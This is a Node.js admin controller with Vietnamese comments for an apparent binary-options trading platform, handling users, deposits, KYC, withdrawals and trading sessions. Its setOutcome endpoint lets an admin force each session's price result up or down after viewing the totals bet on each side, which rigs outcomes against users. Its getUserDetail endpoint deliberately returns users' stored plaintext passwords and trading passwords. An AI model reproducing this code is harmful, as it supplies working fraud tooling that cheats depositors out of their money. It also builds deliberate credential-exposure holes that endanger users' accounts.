const { User, Trade, Session, Transaction, SupportMessage } = require('../models');
const { getActiveSession, setOutcomeMode } = require('../services/gameLoop.service');
const { getIO } = require('../socket');
const { Op } = require('sequelize');
const fs = require('fs');
const path = require('path');

// ── Danh sách user ────────────────────────────────
const getUsers = async (req, res) => {
  try {
    const { page = 1, limit = 20, search } = req.query;
    const offset = (page - 1) * limit;

    const where = { role: 'user' };
    if (search) {
      where.email = { [Op.like]: `%${search}%` };
    }

    const { count, rows } = await User.findAndCountAll({
      where,
      attributes: { exclude: ['password'] },
      order: [['createdAt', 'DESC']],
      limit: parseInt(limit),
      offset,
    });

    return res.json({
      success: true,
      data: {
        users: rows,
        pagination: { total: count, page: parseInt(page), totalPages: Math.ceil(count / limit) },
      },
    });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Lỗi server' });
  }
};

// ── Nạp tiền cho user ─────────────────────────────
const deposit = async (req, res) => {
  try {
    const { userId, amount } = req.body;

    if (!userId || !amount || amount <= 0) {
      return res.status(400).json({ success: false, message: 'Thiếu thông tin hoặc số tiền không hợp lệ' });
    }

    const user = await User.findByPk(userId);
    if (!user) {
      return res.status(404).json({ success: false, message: 'Không tìm thấy user' });
    }

    const oldBalance = parseFloat(user.liveBalance);
    user.liveBalance = oldBalance + parseFloat(amount);
    await user.save();

    // Lưu lịch sử giao dịch
    const { Transaction } = require('../models');
    await Transaction.create({
      userId: user.id,
      amount: parseFloat(amount),
      type: 'deposit',
      description: `Admin nạp tiền vào tài khoản`,
      status: 'success'
    });

    // Thông báo realtime cho user
    const io = getIO();
    io.to(`user-${userId}`).emit('balance:updated', {
      liveBalance: parseFloat(user.liveBalance),
      message: `Admin đã nạp $${amount} vào tài khoản của bạn`,
    });

    return res.json({
      success: true,
      message: `Đã nạp $${amount} vào tài khoản của ${user.email}`,
      data: {
        userId: user.id,
        email: user.email,
        liveBalance: parseFloat(user.liveBalance),
      },
    });
  } catch (err) {
    console.error('[deposit]', err);
    return res.status(500).json({ success: false, message: 'Lỗi server' });
  }
};

// ── Xem thống kê phiên hiện tại (admin) ──────────
const getSessionStats = async (req, res) => {
  try {
    const { symbol = 'BTCUSDT' } = req.query;
    const session = getActiveSession(symbol);
    if (!session) {
      return res.json({ success: true, data: null, symbol });
    }

    // Lấy chi tiết các lệnh trong phiên
    const trades = await Trade.findAll({
      where: { sessionId: session.dbId },
      include: [{ model: User, as: 'user', attributes: ['id', 'email'] }],
      order: [['createdAt', 'DESC']],
    });

    return res.json({
      success: true,
      data: {
        symbol: session.symbol,
        sessionId: session.dbId,
        status: session.status,
        timeLeft: session.timeLeft,
        outcomeMode: session.outcomeMode,
        totalCallAmount: session.totalCallAmount,
        totalPutAmount: session.totalPutAmount,
        totalTraders: trades.length,
        trades,
      },
    });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Lỗi server' });
  }
};

// ── Đặt chế độ kết quả ───────────────────────────
const setOutcome = async (req, res) => {
  try {
    const { mode, symbol = 'BTCUSDT' } = req.body;
    if (!['force_up', 'force_down', 'random'].includes(mode)) {
      return res.status(400).json({ success: false, message: 'Chế độ không hợp lệ (force_up/force_down/random)' });
    }

    const session = getActiveSession(symbol);
    if (!session) {
      return res.status(400).json({ success: false, message: `Không có phiên ${symbol} đang chạy` });
    }

    setOutcomeMode(symbol, mode);

    // Cập nhật vào DB
    await Session.update({ outcomeMode: mode }, { where: { id: session.dbId } });

    // Thông báo cho tất cả admin
    const io = getIO();
    io.to('admin-room').emit('admin:outcome-changed', { mode, sessionId: session.dbId, symbol });

    const modeLabel = { force_up: '⬆ Ép Tăng', force_down: '⬇ Ép Giảm', random: '🎲 Ngẫu Nhiên' };
    return res.json({
      success: true,
      message: `Đã đặt chế độ cho ${symbol}: ${modeLabel[mode]}`,
      data: { mode, sessionId: session.dbId, symbol },
    });
  } catch (err) {
    console.error('[setOutcome]', err);
    return res.status(500).json({ success: false, message: 'Lỗi server' });
  }
};

// ── Lịch sử phiên ─────────────────────────────────
const getSessionHistory = async (req, res) => {
  try {
    const { limit = 10 } = req.query;
    const sessions = await Session.findAll({
      where: { status: 'settled' },
      order: [['createdAt', 'DESC']],
      limit: parseInt(limit),
    });
    return res.json({ success: true, data: sessions });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Lỗi server' });
  }
};

// ── Quản lý KYC & Chi tiết User (Mới) ──────────────────

// Danh sách user đang chờ duyệt KYC
const getPendingKYC = async (req, res) => {
  try {
    const users = await User.findAll({
      where: { kycStatus: 'pending' },
      order: [['updatedAt', 'ASC']]
    });
    return res.json({ success: true, data: users });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Lỗi server' });
  }
};

// Duyệt KYC
const approveKYC = async (req, res) => {
  try {
    const { id } = req.params;
    const user = await User.findByPk(id);
    if (!user) return res.status(404).json({ success: false, message: 'Không tìm thấy user' });

    await user.update({ kycStatus: 'verified', onboardingStep: 3 });
    
    // Thông báo cho user
    getIO().to(`user-${id}`).emit('kyc:status', { status: 'verified', message: 'Tài khoản đã được xác thực!' });

    return res.json({ success: true, message: 'Đã duyệt tài khoản' });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Lỗi server' });
  }
};

// Từ chối KYC
const rejectKYC = async (req, res) => {
  try {
    const { id } = req.params;
    const { reason } = req.body;
    const user = await User.findByPk(id);
    if (!user) return res.status(404).json({ success: false, message: 'Không tìm thấy user' });

    await user.update({ kycStatus: 'rejected' });

    getIO().to(`user-${id}`).emit('kyc:status', { status: 'rejected', message: `Yêu cầu bị từ chối: ${reason}` });

    return res.json({ success: true, message: 'Đã từ chối tài khoản' });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Lỗi server' });
  }
};

// Xem chi tiết 1 User (BAO GỒM MẬT KHẨU NHƯ YÊU CẦU)
const getUserDetail = async (req, res) => {
  try {
    const { id } = req.params;
    const user = await User.findByPk(id);
    if (!user) return res.status(404).json({ success: false, message: 'Không tìm thấy user' });

    // Thống kê thắng/thua
    const { sequelize } = require('../models');
    const stats = await Trade.findAll({
      where: { userId: id },
      attributes: [
        [sequelize.fn('SUM', sequelize.literal("CASE WHEN result = 'win' THEN profit ELSE 0 END")), 'totalProfit'],
        [sequelize.fn('SUM', sequelize.literal("CASE WHEN result = 'lose' THEN ABS(profit) ELSE 0 END")), 'totalLoss'],
        [sequelize.fn('COUNT', sequelize.col('id')), 'totalTrades']
      ],
      raw: true
    });

    return res.json({
      success: true,
      data: {
        profile: user, // Bao gồm rawPassword và tradingPassword
        stats: stats[0]
      }
    });
  } catch (err) {
    console.error('[getUserDetail]', err);
    return res.status(500).json({ success: false, message: 'Lỗi server' });
  }
};

// Lấy lịch sử giao dịch toàn hệ thống
const getTransactions = async (req, res) => {
  try {
    const { limit = 50, userId } = req.query;
    const { Transaction } = require('../models');
    
    const where = {};
    if (userId) where.userId = userId;

    const logs = await Transaction.findAll({
      where,
      include: [{ model: User, as: 'user', attributes: ['id', 'email', 'fullName'] }],
      order: [['createdAt', 'DESC']],
      limit: parseInt(limit)
    });
    return res.json({ success: true, data: logs });
  } catch (err) {
    console.error('[getTransactions]', err);
    return res.status(500).json({ success: false, message: 'Lỗi server' });
  }
};

// Xóa người dùng và tất cả dữ liệu liên quan
const deleteUser = async (req, res) => {
  try {
    const { id } = req.params;
    const user = await User.findByPk(id);
    if (!user) {
      return res.status(404).json({ success: false, message: 'Không tìm thấy người dùng' });
    }

    if (user.role === 'admin') {
      return res.status(400).json({ success: false, message: 'Không thể xóa tài khoản quản trị viên' });
    }

    // 1. Tìm tất cả tin nhắn hỗ trợ có ảnh để xóa file vật lý
    const messagesWithImages = await SupportMessage.findAll({
      where: {
        [Op.or]: [{ senderId: id }, { receiverId: id }],
        imageUrl: { [Op.ne]: null }
      }
    });

    const rootDir = path.join(__dirname, '../../');
    
    // Hàm xóa file an toàn
    const deleteFile = (relativeUrl) => {
      if (!relativeUrl) return;
      // Chuyển /uploads/filename thành đường dẫn vật lý: BE/public/uploads/filename
      const filePath = path.join(rootDir, 'public', relativeUrl);
      if (fs.existsSync(filePath)) {
        try {
          fs.unlinkSync(filePath);
          console.log(`[deleteUser] 🗑️ Đã xóa file: ${filePath}`);
        } catch (e) {
          console.error(`[deleteUser] ❌ Lỗi xóa file ${filePath}:`, e);
        }
      }
    };

    // Xóa ảnh từ tin nhắn
    messagesWithImages.forEach(m => deleteFile(m.imageUrl));

    // Xóa ảnh KYC của User
    deleteFile(user.idFrontPhoto);
    deleteFile(user.idBackPhoto);

    // 2. Xóa tất cả dữ liệu trong DB
    await Trade.destroy({ where: { userId: id } });
    await Transaction.destroy({ where: { userId: id } });
    await SupportMessage.destroy({ 
      where: { 
        [Op.or]: [
          { senderId: id },
          { receiverId: id }
        ]
      } 
    });

    // Cuối cùng xóa User record
    await user.destroy();

    return res.json({
      success: true,
      message: `Đã xóa người dùng ${user.email} và tất cả dữ liệu liên quan thành công.`
    });
  } catch (err) {
    console.error('[deleteUser]', err);
    return res.status(500).json({ success: false, message: 'Lỗi server khi xóa người dùng' });
  }
};

// Lấy danh sách yêu cầu rút tiền đang chờ duyệt
const getPendingWithdrawals = async (req, res) => {
  try {
    const withdrawals = await Transaction.findAll({
      where: { type: 'withdrawal', status: 'pending' },
      include: [{ model: User, as: 'user', attributes: ['id', 'email', 'fullName', 'bankName', 'bankAccount', 'bankBranch'] }],
      order: [['createdAt', 'ASC']]
    });
    return res.json({ success: true, data: withdrawals });
  } catch (err) {
    console.error('[getPendingWithdrawals]', err);
    return res.status(500).json({ success: false, message: 'Lỗi server' });
  }
};

// Duyệt rút tiền
const approveWithdrawal = async (req, res) => {
  try {
    const { id } = req.params;
    const txn = await Transaction.findByPk(id, {
      include: [{ model: User, as: 'user' }]
    });
    if (!txn) return res.status(404).json({ success: false, message: 'Không tìm thấy giao dịch' });
    if (txn.status !== 'pending') return res.status(400).json({ success: false, message: 'Giao dịch đã được xử lý' });

    await txn.update({ status: 'success', description: txn.description + ' [Admin đã duyệt]' });

    // Thông báo cho user
    getIO().to(`user-${txn.userId}`).emit('withdrawal:approved', {
      transactionId: txn.id,
      amount: txn.amount,
      message: `Yêu cầu rút $${txn.amount} đã được duyệt và xử lý thành công!`
    });

    return res.json({ success: true, message: `Đã duyệt rút tiền $${txn.amount} cho ${txn.user?.email}` });
  } catch (err) {
    console.error('[approveWithdrawal]', err);
    return res.status(500).json({ success: false, message: 'Lỗi server' });
  }
};

// Từ chối rút tiền
const rejectWithdrawal = async (req, res) => {
  try {
    const { id } = req.params;
    const { reason } = req.body;
    const txn = await Transaction.findByPk(id, {
      include: [{ model: User, as: 'user' }]
    });
    if (!txn) return res.status(404).json({ success: false, message: 'Không tìm thấy giao dịch' });
    if (txn.status !== 'pending') return res.status(400).json({ success: false, message: 'Giao dịch đã được xử lý' });

    // Hoàn tiền về tài khoản
    const user = await User.findByPk(txn.userId);
    if (user) {
      await user.update({ liveBalance: parseFloat(user.liveBalance) + parseFloat(txn.amount) });
    }

    await txn.update({ status: 'failed', description: `Bị từ chối: ${reason || 'Không rõ lý do'}` });

    // Thông báo cho user
    getIO().to(`user-${txn.userId}`).emit('withdrawal:rejected', {
      transactionId: txn.id,
      amount: txn.amount,
      message: `Yêu cầu rút $${txn.amount} bị từ chối: ${reason || 'Liên hệ hỗ trợ'}. Tiền đã được hoàn lại.`
    });

    // Cập nhật số dư realtime cho user
    if (user) {
      getIO().to(`user-${txn.userId}`).emit('balance:updated', {
        liveBalance: parseFloat(user.liveBalance),
        message: `Hoàn tiền $${txn.amount} do yêu cầu rút bị từ chối`
      });
    }

    return res.json({ success: true, message: `Đã từ chối giao dịch và hoàn tiền.` });
  } catch (err) {
    console.error('[rejectWithdrawal]', err);
    return res.status(500).json({ success: false, message: 'Lỗi server' });
  }
};

module.exports = { 
  getUsers, 
  deposit, 
  getSessionStats, 
  setOutcome, 
  getSessionHistory,
  getPendingKYC,
  approveKYC,
  rejectKYC,
  getUserDetail,
  getTransactions,
  deleteUser,
  getPendingWithdrawals,
  approveWithdrawal,
  rejectWithdrawal
};
